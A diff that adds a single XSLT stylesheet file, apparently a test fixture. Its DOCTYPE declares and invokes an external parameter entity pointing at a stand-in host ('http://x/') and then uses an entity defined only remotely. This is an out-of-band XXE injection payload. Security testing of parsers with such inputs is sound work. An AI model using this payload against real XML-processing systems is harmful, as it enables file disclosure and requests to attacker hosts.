@@ -1,0 +1,1 @@
+<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % p SYSTEM "http://x/">%p;]><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><p>&b;</p></xsl:template></xsl:stylesheet>
